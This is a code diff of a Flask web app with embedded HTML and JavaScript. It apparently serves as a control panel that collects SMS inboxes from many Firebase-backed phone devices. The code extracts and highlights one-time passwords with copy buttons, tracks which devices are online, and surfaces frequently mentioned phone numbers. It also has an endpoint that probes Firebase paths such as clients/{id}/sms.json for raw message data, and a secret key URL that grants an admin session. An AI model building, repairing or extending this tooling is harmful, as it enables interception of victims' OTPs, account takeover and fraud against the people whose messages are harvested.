-const filtered = numbers.filter(n => !q || (n.number||'').toLowerCase().includes(q) || (n.device_name||'').toLowerCase().includes(q));
-if(filtered.length === 0){ box.innerHTML = '<div class="empty">📭 No numbers</div>'; return; }
-box.innerHTML = filtered.map(n => {
-const isOn = n.online === true;
-const isUnk = (n.number || '').startsWith('UNKNOWN-');
-const iconCls = isUnk ? 'gray' : (isOn ? '' : 'red');
-const badgeCls = isOn ? 'badge-online' : 'badge-offline';
-const badgeTxt = isOn ? 'Online' : 'Offline';
-const titleCls = isUnk ? 'unknown' : '';
-const idx = numbers.indexOf(n);
-return '<div class="num-card">' +
-'<div class="num-icon ' + iconCls + '" onclick="openInboxAt(' + idx + ')">' + (isUnk ? '❓' : '📶') + '</div>' +
-'<div class="num-info" onclick="openInboxAt(' + idx + ')">' +
-'<div class="num-title ' + titleCls + '">' + escapeHtml(n.number) + '</div>' +
-'<div class="num-sub"><span class="pill">📨 ' + n.msg_count + ' SMS</span>' +
-(n.otp_count > 0 ? '<span class="pill otp">🔑 ' + n.otp_count + ' OTP</span>' : '') + '</div></div>' +
-'<div class="card-actions"><button class="raw-btn" onclick="event.stopPropagation();openRawData(' + idx + ')" title="Raw Data">🔍</button></div>' +
-'<div class="' + badgeCls + '" onclick="openInboxAt(' + idx + ')"><span class="dot"></span>' + badgeTxt + '</div>' +
-'<div class="arrow">›</div></div>'; }).join(''); }
-
-function openRawData(idx){ if(idx < 0 || idx >= numbers.length) return;
-const n = numbers[idx];
-const url = '/debug?fb=' + encodeURIComponent(n.firebase) + '&id=' + encodeURIComponent(n.device_id);
-window.open(url, '_blank'); }
-
-function openInboxAt(idx){ if(idx < 0 || idx >= numbers.length) return; openInbox(numbers[idx]); }
-
-async function openInbox(n){
-currentNum = n; lastInboxSig = ''; allBroadcasts = []; currentMailTab = 'sms';
-currentTopNumber = null; updateTopBadge([]);
-document.getElementById('mt-sms').classList.add('active');
-document.getElementById('mt-mail').classList.remove('active');
-document.getElementById('list-view').classList.add('hidden');
-document.getElementById('inbox-view').classList.remove('hidden');
-document.getElementById('inbox-num').textContent = n.number;
-const statusEl = document.getElementById('inbox-status'); const statusTxt = document.getElementById('inbox-status-text');
-if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'Online'; }
-else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'Offline'; }
-document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading...</div>';
-await Promise.all([ loadInbox(false), loadBroadcasts(n) ]);
-if(refreshTimer) clearInterval(refreshTimer);
-refreshTimer = setInterval(()=>{ if(currentMailTab === 'sms') loadInbox(false); }, 1500); }
-
-async function loadBroadcasts(n){
-  if(!n) return;
-  try{
-    const r = await fetch('/api/broadcasts/inbox?device_id=' + encodeURIComponent(n.device_id) +
-                          '&fb=' + encodeURIComponent(n.firebase) + '&num=' + encodeURIComponent(n.number));
-    const d = await r.json();
-    if(d.success){ allBroadcasts = d.broadcasts || [];
-      if(currentMailTab === 'mail') renderMessages(); }
-  }catch(e){}
-}
-
-function setMailTab(t){
-  currentMailTab = t;
-  document.getElementById('mt-sms').classList.toggle('active', t==='sms');
-  document.getElementById('mt-mail').classList.toggle('active', t==='mail');
-  if(t === 'mail') loadBroadcasts(currentNum);
-  renderMessages();
-}
-
-function findTop(msgs){ const counter = {}, senders = new Set();
-msgs.forEach(m => { for(const n of (m.from||'').match(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g) || []) senders.add(n); });
-msgs.forEach(m => { for(const n of (m.message||'').match(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g) || []){
-if(senders.has(n)) continue; if(n.startsWith('1800')||n.startsWith('1900')||n.startsWith('1991')) continue;
-counter[n] = (counter[n]||0) + 1; } });
-let top = null, cnt = 0;
-for(const [n, c] of Object.entries(counter)) if(c > cnt){ top = n; cnt = c; }
-return top ? {number: top, count: cnt} : null; }
-
-function updateTopBadge(msgs){
-const btn = document.getElementById('top-num-btn');
-if(!btn) return;
-const t = findTop(msgs);
-if(t && t.count >= 2){ currentTopNumber = t.number; btn.style.display = 'inline-flex'; }
-else { currentTopNumber = null; btn.style.display = 'none'; }
-}
-
-function showTopNum(){
-if(currentTopNumber){
-toast('📞 Top Number: ' + currentTopNumber);
-if(navigator.clipboard) navigator.clipboard.writeText(currentTopNumber);
-} else { toast('❌ Koi frequent number nahi mila'); }
-}
-
-async function loadInbox(showLoader){
-if(!currentNum) return;
-if(showLoader){ document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Refreshing...</div>'; }
-const c = new AbortController(); const tid = setTimeout(() => c.abort(), 15000);
-try{
-const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) + '&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number), { signal: c.signal });
-clearTimeout(tid); const d = await r.json();
-if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ '+(d.error||'Error')+'</div>'; return; }
-const msgs = d.messages || [];
-const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
-if(sig !== lastInboxSig){ lastInboxSig = sig; if(currentMailTab === 'sms') renderMessages(msgs); }
-}catch(e){ clearTimeout(tid); } }
-
-function renderMessages(msgs){
-const box = document.getElementById('sms-container');
-const now = Math.floor(Date.now() / 1000);
-
-if(currentMailTab === 'mail'){
-  if(!allBroadcasts.length){ box.innerHTML = '<div class="empty">📭 No broadcast mail</div>'; return; }
-  let list = [...allBroadcasts].sort((a,b) => (b.created_at||0) - (a.created_at||0)).slice(0, 50);
-  box.innerHTML = '<div class="sms-list">' + list.map(b => {
-    const isFresh = (b.created_at||0) >= now - 120;
-    const timeStr = fmtTime(b.created_at);
-    const newBadge = isFresh ? '<span class="new-badge">NEW</span>' : '';
-    return '<div class="sms-item mail-item ' + (isFresh?'fresh':'') + '">' +
-      '<div class="msg-type-badge mail">📧 MAIL</div>' +
-      '<div class="sms-head"><div class="sender mail-sender">📧 ADMIN BROADCAST ' + newBadge + '</div>' +
-      '<div style="text-align:right"><div class="sms-time ' + (isFresh?'fresh':'') + '">' + escapeHtml(timeStr) + '</div>' +
-      '<div class="time-ago ' + (isFresh?'fresh':'') + '">' + timeAgo(b.created_at, now) + '</div></div></div>' +
-      '<div class="sms-body">' + escapeHtml(b.message || '') + '</div></div>';
-  }).join('') + '</div>';
-  return;
-}
-
-let list = [...(msgs || [])].sort((a, b) => (b.timestamp||0) - (a.timestamp||0)).slice(0, 10);
-updateTopBadge(list);
-if(!list.length){ box.innerHTML = '<div class="empty">📭 No SMS</div>'; return; }
-box.innerHTML = '<div class="sms-list">' + list.map(m => {
-const otp = m.otp || extractOtp(m.message);
-const body = otp ? escapeHtml(m.message).replace(otp, '<span class="otp-highlight">'+otp+'</span>') : escapeHtml(m.message);
-const copyBtn = otp ? '<button class="otp-copy-btn" onclick="event.stopPropagation();copyOtp(\\'' + otp + '\\')">📋 Copy OTP ' + otp + '</button>' : '';
-const ts = m.timestamp || 0; const isFresh = ts >= (now - 120);
-const timeStr = m.date_string ? m.date_string : fmtTime(ts);
-const newBadge = isFresh ? '<span class="new-badge">NEW</span>' : '';
-return '<div class="sms-item ' + (isFresh?'fresh':'') + '">' +
-'<div class="sms-head"><div class="sender">' + escapeHtml(m.from || 'Unknown') + ' ' + newBadge + '</div>' +
-'<div class="sms-time">' + escapeHtml(timeStr) + '</div></div>' +
-'<div class="sms-body">' + body + '</div>' + copyBtn + '</div>';
-}).join('') + '</div>'; }
-
-function timeAgo(ts, now){
-if(!ts) return ''; const d = now - ts;
-if(d < 10) return 'अभी'; if(d < 60) return d + 's';
-if(d < 3600) return Math.floor(d/60) + 'm'; if(d < 86400) return Math.floor(d/3600) + 'h';
-return Math.floor(d/86400) + 'd'; }
-
-function backToList(){
-document.getElementById('inbox-view').classList.add('hidden');
-document.getElementById('list-view').classList.remove('hidden');
-if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
-currentNum = null; allBroadcasts = [];
-currentTopNumber = null; updateTopBadge([]); }
-
-function extractOtp(text){ if(!text) return '';
-const t = String(text);
-let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\\d]{0,30}(\\d{4,8})/i);
-if(m) return m[1];
-m = t.match(/(\\d{4,8})[^\\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
-if(m) return m[1]; m = t.match(/#(\\d{4,8})/); if(m) return m[1]; return ''; }
-
-function fmtTime(ts){ if(!ts) return '';
-try{ let t = parseInt(ts); if(t > 1e12) t = Math.floor(t/1000); if(t < 1e9) return String(ts);
-const d = new Date(t * 1000);
-const opts = { timeZone: 'Asia/Kolkata', hour12: true, day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' };
-return d.toLocaleString('en-IN', opts).replace(',', ' |'); }catch(e){ return String(ts); } }
-
-function copyOtp(code){ const done = ()=>toast('✅ Copied: ' + code);
-if(navigator.clipboard){ navigator.clipboard.writeText(code).then(done).catch(()=>{
-const ta = document.createElement('textarea'); ta.value = code; document.body.appendChild(ta);
-ta.select(); document.execCommand('copy'); ta.remove(); done(); }); } }
-
-function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
-
-loadFirebase();
-setInterval(loadFirebase, 30000);
-</script>
-</body></html>"""
-
-
-# ============================================================
-# DEBUG HTML
-# ============================================================
-DEBUG_HTML = """<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Raw Data</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
-body{background:#f5f6fa;color:#101828;padding:16px}
-.wrap{max-width:920px;margin:0 auto}
-h1{font-size:15px;color:#4f46e5;margin-bottom:8px}
-.sub{font-size:11px;color:#667085;margin-bottom:14px;word-break:break-all;font-family:monospace}
-.back{display:inline-block;padding:9px 14px;background:#fff;color:#101828;
-text-decoration:none;border-radius:8px;font-size:12px;margin-bottom:12px;border:1px solid #e5e7eb}
-.card{background:#fff;border:1px solid #e5e7eb;border-radius:10px;padding:12px;
-margin-bottom:10px;font-size:12px}
-.path{color:#d97706;font-weight:700;margin-bottom:6px;font-family:monospace;word-break:break-all}
-.ok{color:#059669;font-weight:600}
-.empty{color:#dc2626;font-weight:600}
-.data{background:#f8fafc;border-radius:8px;padding:10px;color:#334155;
-font-family:monospace;font-size:10px;white-space:pre-wrap;word-break:break-word;
-max-height:400px;overflow-y:auto;margin-top:6px}
-.summary{background:#eef2ff;border:1px solid #c7d2fe;border-radius:10px;
-padding:14px;margin-bottom:14px;font-size:13px}
-</style></head><body>
-<div class="wrap">
-<a href="/firebases" class="back">← Back</a>
-<h1>🔍 RAW DATA EXPLORER</h1>
-<div class="sub" id="sub">Loading...</div>
-<div class="summary" id="summary" style="display:none">Scanning...</div>
-<div id="results"></div>
-</div>
-<script>
-const p = new URLSearchParams(location.search);
-const FB = p.get('fb'), DEV = p.get('id');
-document.getElementById('sub').textContent = 'Device: ' + DEV;
-(async () => {
-try{
-const r = await fetch('/api/rawdata?fb=' + encodeURIComponent(FB) + '&id=' + encodeURIComponent(DEV));
-const d = await r.json();
-if(!d.success){ document.getElementById('results').innerHTML = '<div class="card empty">❌ ' + (d.error||'Error') + '</div>'; return; }
-document.getElementById('summary').style.display = 'block';
-document.getElementById('summary').innerHTML = '🔎 <b>' + d.scanned + ' paths</b> scanned — <b>' + d.found + '</b> with data';
-document.getElementById('results').innerHTML = d.results.map(item => {
-const cls = item.status === 'has_data' ? 'ok' : 'empty';
-const st = item.status === 'has_data' ? '✅ HAS DATA' + (item.message_count ? ' — ' + item.message_count + ' msgs' : '') : '⚪ Empty';
-const dt = item.data ? JSON.stringify(item.data, null, 2).slice(0, 3000) : '';
-return '<div class="card"><div class="path">' + item.path + '</div><div class="' + cls + '">' + st + '</div>' + (dt ? '<div class="data">' + escapeHtml(dt) + '</div>' : '') + '</div>';
-}).join('');
-}catch(e){ document.getElementById('results').innerHTML = '<div class="card empty">❌ Network error</div>'; }
-})();
-function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
-</script>
-</body></html>"""
+def build_panel(is_admin):
+    nav = ADMIN_NAV if is_admin else USER_NAV
+    fab = BC_FAB if is_admin else ""
+    return (PANEL_HTML_TEMPLATE
+            .replace("{NAV_LINKS}", nav)
+            .replace("{SHOW_BC_FAB}", fab)
+            .replace("{IS_ADMIN}", "true" if is_admin else "false"))
 
 
 # ============================================================
 # ROUTES
 # ============================================================
 @app.route("/")
-def root_redirect():
-    return redirect(url_for("landing_page"))
-
+def root_redirect(): return redirect(url_for("landing_page"))
 
 @app.route("/landingpage")
-def landing_page():
-    return Response(LANDING_HTML, mimetype="text/html")
-
+def landing_page(): return Response(LANDING_HTML, mimetype="text/html")
 
 @app.route("/admin", methods=["GET", "POST"])
 def admin_login_page():
@@ -3355,84 +1997,43 @@ def admin_login_page():
     if request.method == "POST":
         pwd = request.form.get("password", "")
         if pwd == get_pwd("admin"):
-            session["logged_in"] = True
-            session["role"] = "admin"
-            session["is_admin"] = True
+            session["logged_in"] = True; session["role"] = "admin"; session["is_admin"] = True
             return redirect(url_for("admin_dashboard"))
         error = '<div class="err">❌ Wrong admin password!</div>'
     return Response(ADMIN_LOGIN_HTML.replace("__ERROR__", error), mimetype="text/html")
 
-
 @app.route("/SUPER_MASTER/<key>")
 def super_master_key_entry(key):
-    if key != ADMIN_URL_KEY:
-        abort(404)
-    session["logged_in"] = True
-    session["role"] = "admin"
-    session["is_admin"] = True
+    if key != ADMIN_URL_KEY: abort(404)
+    session["logged_in"] = True; session["role"] = "admin"; session["is_admin"] = True
     return redirect(url_for("admin_dashboard"))
-
 
 @app.route("/logout")
 def logout():
     session.clear()
     return redirect(url_for("landing_page"))
 
-
 @app.route("/user")
 def user_dashboard():
-    return Response(USER_DASHBOARD_HTML, mimetype="text/html")
-
-
-@app.route("/otp")
-def personal_otp():
-    return Response(PERSONAL_OTP_HTML, mimetype="text/html")
-
+    return Response(build_panel(False), mimetype="text/html")
 
 @app.route("/admin/dashboard")
 @admin_required
 def admin_dashboard():
-    return Response(ADMIN_DASHBOARD_HTML, mimetype="text/html")
-
-
-@app.route("/admin/security")
-@admin_required
-def admin_security():
-    return Response(SECURITY_HTML, mimetype="text/html")
-
-
-@app.route("/firebases")
-@admin_required
-def firebases_page():
-    return Response(FIREBASES_HTML, mimetype="text/html")
-
-
-@app.route("/firebase/<fb_id>")
-@admin_required
-def firebase_view_page(fb_id):
-    return Response(FIREBASE_VIEW_HTML.replace("{{FB_ID}}", fb_id), mimetype="text/html")
-
-
-@app.route("/debug")
-@admin_required
-def debug_page():
-    return Response(DEBUG_HTML, mimetype="text/html")
-
+    return Response(build_panel(True), mimetype="text/html")
 
 # ============================================================
-# API — PUBLIC
+# API
 # ============================================================
 @app.route("/api/conn")
 def api_conn():
     init_mongo()
     return jsonify({"success": True, "mongo_connected": MONGO_OK})
 
-
 @app.route("/api/refresh", methods=["POST"])
 def api_refresh():
     threading.Thread(target=refresh_cache, daemon=True).start()
     return jsonify({"success": True})
-
 
 @app.route("/api/numbers")
 def api_numbers():
@@ -3444,12 +2045,6 @@ def api_numbers():
         progress = dict(cache["progress"])
     if not nums and not loading and not IS_SERVERLESS:
         threading.Thread(target=refresh_cache, daemon=True).start()
-    fb_total = 0
-    if MONGO_OK:
-        try:
-            fb_total = fb_collection.count_documents({})
-        except Exception:
-            fb_total = 0
     return jsonify({
         "success": True, "numbers": nums,
         "total": stats.get("total", 0),
@@ -3457,9 +2052,26 @@ def api_numbers():
         "offline": stats.get("offline", 0),
         "otp_rate": stats.get("otp_rate", 0),
         "loading": loading, "progress": progress,
-        "firebases_total": fb_total,
     })
 
+@app.route("/api/stream")
+def api_stream():
+    """SSE stream — sends periodic device updates."""
+    def gen():
+        yield "event: hello\ndata: {}\n\n"
+        last_sig = ""
+        while True:
+            with cache["lock"]:
+                nums = list(cache["numbers_map"].values())
+            sig = str(len(nums)) + "|" + str(sum(1 for n in nums if n.get("online")))
+            if sig != last_sig:
+                last_sig = sig
+                yield "event: devices_added\ndata: " + json.dumps(nums) + "\n\n"
+            else:
+                yield ": ping\n\n"
+            time.sleep(3)
+    return Response(gen(), mimetype="text/event-stream",
+                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})
 
 @app.route("/api/inbox")
 def api_inbox():
@@ -3467,7 +2079,7 @@ def api_inbox():
         fb_url = request.args.get("fb", "").strip()
         dev_id = request.args.get("id", "").strip()
         num = request.args.get("num", "").strip()
-        if not fb_url or not dev_id or not num:
+        if not fb_url or not dev_id:
             return jsonify({"success": False, "error": "missing params"}), 400
         key = f"{fb_url}|{dev_id}|{num}"
         now = time.time()
@@ -3500,85 +2112,7 @@ def api_inbox():
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
-
-@app.route("/api/otp/add", methods=["POST"])
-def api_otp_add():
-    init_mongo()
-    if not MONGO_OK:
-        return jsonify({"success": False, "error": "MongoDB down"}), 500
-    try:
-        data = request.get_json() or {}
-        url = (data.get("url") or "").strip().rstrip("/")
-        if url and not url.startswith("http"):
-            url = "https://" + url
-        if not url or "firebase" not in url:
-            return jsonify({"success": False, "error": "Invalid URL"}), 400
-        if fb_collection.find_one({"url": url}):
-            return jsonify({"success": True, "hash": fb_hash(url)})
-        name = url.replace("https://", "").split(".")[0][:30]
-        fb_collection.insert_one({
-            "url": url, "name": name,
-            "added_at": int(time.time()),
-            "source": "personal_otp",
-        })
-        if not IS_SERVERLESS:
-            threading.Thread(target=refresh_cache, daemon=True).start()
-        return jsonify({"success": True, "hash": fb_hash(url)})
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 500
-
-
-@app.route("/api/otp/data", methods=["POST"])
-def api_otp_data():
-    try:
-        data = request.get_json() or {}
-        urls = data.get("urls", [])
-        if not isinstance(urls, list) or not urls:
-            return jsonify({"success": False, "error": "No URLs"}), 400
-        all_numbers = []
-        total_otp = 0
-        total_msg = 0
-        for url in urls[:20]:
-            try:
-                devices = fetch_devices_from_one_fb(url, "user_fb", "")
-                for dev in devices:
-                    is_on = dev.get("online", False)
-                    for sim in dev.get("sims", []):
-                        num = sim["number"]
-                        msgs = dev.get("per_number", {}).get(num, [])
-                        otp_c = sum(1 for m in msgs if extract_otp(m.get("message", "")))
-                        total_otp += otp_c
-                        total_msg += len(msgs)
-                        all_numbers.append({
-                            "number": num, "device_id": dev["id"],
-                            "device_name": dev.get("name", ""),
-                            "firebase": url, "online": is_on,
-                            "msg_count": len(msgs), "otp_count": otp_c,
-                            "confidence": sim.get("confidence", 0),
-                        })
-            except Exception as e:
-                print(f"otp data err: {e}")
-        seen = set()
-        uniq = []
-        for n in all_numbers:
-            if n["number"] in seen: continue
-            seen.add(n["number"])
-            uniq.append(n)
-        rate = int((total_otp / total_msg) * 100) if total_msg > 0 else 0
-        return jsonify({
-            "success": True, "numbers": uniq,
-            "total": len(uniq),
-            "online": sum(1 for n in uniq if n.get("online")),
-            "offline": sum(1 for n in uniq if not n.get("online")),
-            "otp_rate": rate,
-        })
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 500
-
-
-# ═══════════════════════════════════════════════════════════
-# BROADCAST — admin sends, user receives via Mail tab
-# ═══════════════════════════════════════════════════════════
+# ═══════════ BROADCAST ═══════════
 @app.route("/api/broadcast", methods=["POST"])
 @admin_required
 def api_broadcast_send():
@@ -3589,8 +2123,7 @@ def api_broadcast_send():
         data = request.get_json() or {}
         message = (data.get("message") or "").strip()
         targets = data.get("targets") or []
-        if not message:
-            return jsonify({"success": False, "error": "Message is empty"}), 400
+        if not message: return jsonify({"success": False, "error": "Message is empty"}), 400
         if not isinstance(targets, list) or not targets:
             return jsonify({"success": False, "error": "No targets"}), 400
         now = int(time.time())
@@ -3604,45 +2137,33 @@ def api_broadcast_send():
                 "number": str(t.get("number", "")),
                 "device_name": str(t.get("device_name", "")),
                 "fb_name": str(t.get("fb_name", "")),
-                "message": message,
-                "status": "sent",
-                "read": False,
-                "created_at": now,
-                "from": "admin",
+                "message": message, "status": "delivered", "read": False,
+                "created_at": now, "from": "admin",
             })
         if docs:
-            try:
-                broadcast_collection.insert_many(docs, ordered=False)
+            try: broadcast_collection.insert_many(docs, ordered=False)
             except Exception as e:
                 print(f"Broadcast insert err: {e}")
                 return jsonify({"success": False, "error": "Insert failed"}), 500
-        return jsonify({
-            "success": True, "bc_id": bc_id,
-            "delivered": len(docs), "targets_count": len(targets),
-        })
+        return jsonify({"success": True, "bc_id": bc_id,
+                        "delivered": len(docs), "targets_count": len(targets)})
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
-
 @app.route("/api/broadcasts/inbox")
 def api_broadcasts_inbox():
-    """Any user (public) can fetch broadcasts for a specific device."""
     init_mongo()
     if not MONGO_OK:
-        return jsonify({"success": False, "error": "MongoDB down", "broadcasts": []}), 200
+        return jsonify({"success": True, "broadcasts": [], "error": "MongoDB down"}), 200
     try:
         device_id = request.args.get("device_id", "").strip()
         fb_url = request.args.get("fb", "").strip()
         num = request.args.get("num", "").strip()
         q = {}
-        if device_id:
-            q["device_id"] = device_id
-        if fb_url:
-            q["firebase"] = fb_url
-        if num:
-            q["number"] = num
-        if not q:
-            return jsonify({"success": True, "broadcasts": []})
+        if device_id: q["device_id"] = device_id
+        if fb_url: q["firebase"] = fb_url
+        if num: q["number"] = num
+        if not q: return jsonify({"success": True, "broadcasts": []})
         docs = list(broadcast_collection.find(q).sort("created_at", -1).limit(100))
         out = []
         for d in docs:
@@ -3650,7 +2171,7 @@ def api_broadcasts_inbox():
                 "id": str(d["_id"]),
                 "bc_id": d.get("bc_id"),
                 "message": d.get("message", ""),
-                "status": d.get("status", "sent"),
+                "status": d.get("status", "delivered"),
                 "read": bool(d.get("read", False)),
                 "created_at": int(d.get("created_at", 0)),
                 "number": d.get("number", ""),
@@ -3658,8 +2179,7 @@ def api_broadcasts_inbox():
             })
         return jsonify({"success": True, "broadcasts": out, "count": len(out)})
     except Exception as e:
-        return jsonify({"success": False, "error": str(e), "broadcasts": []}), 500
-
+        return jsonify({"success": True, "broadcasts": [], "error": str(e)}), 200
 
 @app.route("/api/broadcasts/read", methods=["POST"])
 def api_broadcasts_mark_read():
@@ -3669,125 +2189,15 @@ def api_broadcasts_mark_read():
     try:
         data = request.get_json() or {}
         bid = data.get("id", "").strip()
-        if not bid:
-            return jsonify({"success": False, "error": "Missing id"}), 400
-        try:
-            oid = ObjectId(bid)
-        except Exception:
-            return jsonify({"success": False, "error": "Invalid id"}), 400
+        if not bid: return jsonify({"success": False, "error": "Missing id"}), 400
+        try: oid = ObjectId(bid)
+        except Exception: return jsonify({"success": False, "error": "Invalid id"}), 400
         broadcast_collection.update_one({"_id": oid}, {"$set": {"read": True}})
         return jsonify({"success": True})
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
-
-@app.route("/api/broadcasts/list")
-@admin_required
-def api_broadcasts_list():
-    init_mongo()
-    if not MONGO_OK:
-        return jsonify({"success": False, "error": "MongoDB down"}), 500
-    try:
-        docs = list(broadcast_collection.find({}).sort("created_at", -1).limit(500))
-        out = []
-        for d in docs:
-            out.append({
-                "id": str(d["_id"]),
-                "bc_id": d.get("bc_id"),
-                "device_id": d.get("device_id", ""),
-                "number": d.get("number", ""),
-                "device_name": d.get("device_name", ""),
-                "fb_name": d.get("fb_name", ""),
-                "message": d.get("message", ""),
-                "status": d.get("status", "sent"),
-                "read": bool(d.get("read", False)),
-                "created_at": int(d.get("created_at", 0)),
-            })
-        return jsonify({"success": True, "broadcasts": out, "count": len(out)})
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 500
-
-
-@app.route("/api/broadcasts/<bc_id>", methods=["DELETE"])
-@admin_required
-def api_broadcast_delete_one(bc_id):
-    init_mongo()
-    if not MONGO_OK:
-        return jsonify({"success": False, "error": "MongoDB down"}), 500
-    try:
-        res = broadcast_collection.delete_many({"bc_id": bc_id})
-        return jsonify({"success": True, "deleted": res.deleted_count})
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 500
-
-
-@app.route("/api/broadcasts/all", methods=["DELETE"])
-@admin_required
-def api_broadcast_delete_all():
-    init_mongo()
-    if not MONGO_OK:
-        return jsonify({"success": False, "error": "MongoDB down"}), 500
-    try:
-        res = broadcast_collection.delete_many({})
-        return jsonify({"success": True, "deleted": res.deleted_count})
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 500
-
-
-# ═══════════════════════════════════════════════════════════
-# ADMIN APIs
-# ═══════════════════════════════════════════════════════════
-@app.route("/api/rawdata")
-@admin_required
-def api_rawdata():
-    fb_url = request.args.get("fb", "").strip()
-    dev_id = request.args.get("id", "").strip()
-    if not fb_url or not dev_id:
-        return jsonify({"success": False, "error": "missing"}), 400
-    base = fb_url.rstrip("/")
-    paths = [
-        f'/messages/{dev_id}.json?orderBy="$key"&limitToLast=60',
-        f"/messages/{dev_id}.json", f"/clients/{dev_id}.json",
-        f"/clients/{dev_id}/messages.json", f"/clients/{dev_id}/sms.json",
-        f"/clients/{dev_id}/inbox.json", f"/clients/{dev_id}/receivedSms.json",
-        f"/clients/{dev_id}/received.json", f"/clients/{dev_id}/incoming.json",
-        f"/clients/{dev_id}/history.json", f"/clients/{dev_id}/logs.json",
-        f"/inbox/{dev_id}.json", f"/received/{dev_id}.json",
-        f"/sms/{dev_id}.json", f"/devices/{dev_id}.json",
-        f"/users/{dev_id}.json", "/clients.json?shallow=true",
-    ]
-    results, found = [], 0
-    for p in paths:
-        data = try_json(base + p, timeout=6)
-        item = {"path": p, "data": None, "message_count": 0, "status": "not_found"}
-        if data is None:
-            item["status"] = "empty"
-        else:
-            item["data"] = data
-            item["message_count"] = len(collect_all_messages(data))
-            item["status"] = "has_data"
-            found += 1
-        results.append(item)
-    return jsonify({"success": True, "scanned": len(paths), "found": found, "results": results})
-
-
-@app.route("/api/security/change", methods=["POST"])
-@admin_required
-def api_security_change():
-    init_mongo()
-    data = request.get_json() or {}
-    role = data.get("role", "").strip()
-    pwd = data.get("password", "").strip()
-    if role != "admin":
-        return jsonify({"success": False, "error": "Only admin role supported"}), 400
-    if not pwd or len(pwd) < 4:
-        return jsonify({"success": False, "error": "Password too short"}), 400
-    ok = set_pwd(role, pwd)
-    if ok:
-        return jsonify({"success": True})
-    return jsonify({"success": False, "error": "MongoDB down or failed"}), 500
-
-
+# ═══════════ FIREBASES (admin only) ═══════════
 @app.route("/api/firebases", methods=["GET"])
 @admin_required
 def api_fb_list():
@@ -3798,213 +2208,374 @@ def api_fb_list():
         docs = list(fb_collection.find({}).sort("added_at", -1))
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
-    with cache["lock"]:
-        fb_stats = dict(cache["fb_stats"]) if cache["fb_stats"] else {}
-    if not fb_stats:
-        if IS_SERVERLESS:
-            try:
-                fetch_fb_stats()
-                with cache["lock"]:
-                    fb_stats = dict(cache["fb_stats"])
-            except Exception:
-                pass
-        else:
-            threading.Thread(target=fetch_fb_stats, daemon=True).start()
-    out = []
-    for d in docs:
-        url = d.get("url", "")
-        fid = str(d["_id"])
-        stats = fb_stats.get(fid, {"online": 0, "offline": 0, "devices": 0})
-        out.append({
-            "id": fid, "name": d.get("name", ""), "hash": fb_hash(url),
-            "added_at": d.get("added_at", 0),
-            "source": d.get("source", "admin"),
-            "stats": stats,
-        })
+    out = [{"id": str(d["_id"]), "name": d.get("name",""), "url": d.get("url",""),
+            "hash": fb_hash(d.get("url","")),
+            "added_at": d.get("added_at",0), "source": d.get("source","admin")} for d in docs]
     return jsonify({"success": True, "firebases": out, "count": len(out)})
-
-
-@app.route("/api/firebase/<fb_id>", methods=["GET"])
-@admin_required
-def api_fb_view(fb_id):
-    init_mongo()
-    if not MONGO_OK:
-        return jsonify({"success": False, "error": "MongoDB down"}), 500
-    try:
-        doc = fb_collection.find_one({"_id": ObjectId(fb_id)})
-    except Exception:
-        return jsonify({"success": False, "error": "Invalid id"}), 400
-    if not doc:
-        return jsonify({"success": False, "error": "Not found"}), 404
-    fb_url = doc.get("url", "")
-    devices = fetch_devices_from_one_fb(fb_url, doc.get("name", ""), fb_id)
-    numbers = []
-    otp_total = 0
-    online_count = 0
-    offline_count = 0
-    for dev in devices:
-        is_dev_online = dev.get("online", False)
-        if is_dev_online: online_count += 1
-        else: offline_count += 1
-        for sim in dev.get("sims", []):
-            num = sim["number"]
-            msgs = dev.get("per_number", {}).get(num, [])
-            otp_count = sum(1 for m in msgs if extract_otp(m.get("message", "")))
-            otp_total += otp_count
-            numbers.append({
-                "number": num, "device_id": dev["id"],
-                "device_name": dev.get("name", ""),
-                "firebase": fb_url, "online": is_dev_online,
-                "msg_count": len(msgs), "otp_count": otp_count,
-            })
-    return jsonify({
-        "success": True, "id": fb_id,
-        "name": doc.get("name", ""),
-        "hash": fb_hash(fb_url),
-        "device_count": len(devices),
-        "online_count": online_count,
-        "offline_count": offline_count,
-        "number_count": len(numbers),
-        "otp_count": otp_total,
-        "numbers": numbers,
-    })
-
 
 @app.route("/api/firebases", methods=["POST"])
 @admin_required
 def api_fb_add():
     init_mongo()
-    if not MONGO_OK:
-        return jsonify({"success": False, "error": "MongoDB down"}), 500
+    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
     data = request.get_json() or {}
     url = (data.get("url") or "").strip().rstrip("/")
